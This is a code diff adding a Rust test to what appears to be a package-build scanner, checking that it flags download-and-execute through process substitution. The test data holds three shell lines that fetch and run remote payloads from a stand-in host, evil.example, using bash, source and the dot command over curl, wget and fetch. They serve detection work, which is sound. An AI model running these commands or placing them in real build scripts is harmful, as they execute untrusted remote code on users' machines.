@@ -287,6 +287,23 @@ fn download_exec_blocks() {
 }
 
 #[test]
+fn download_exec_process_substitution_blocks() {
+    // `bash <(curl ...)` / `source <(wget ...)` — the shell reads a fetched
+    // payload via process substitution; no pipe, so the pipe rule alone missed it.
+    for line in [
+        "prepare() {\n  bash <(curl -s http://evil.example/z)\n}\n",
+        "prepare() {\n  source <(wget -qO- http://evil.example/w)\n}\n",
+        "prepare() {\n  . <(fetch -o- http://evil.example/f)\n}\n",
+    ] {
+        let r = scan(&pkg(line));
+        assert!(
+            rules(&r).contains(&"download-exec"),
+            "process-substitution download-exec missed: {line:?}"
+        );
+    }
+}
+
+#[test]
 fn untrusted_host_warns() {
     let r = scan(&pkg(
         "url='https://example.com'\nsource=('https://pastebin.com/raw/x')\n",
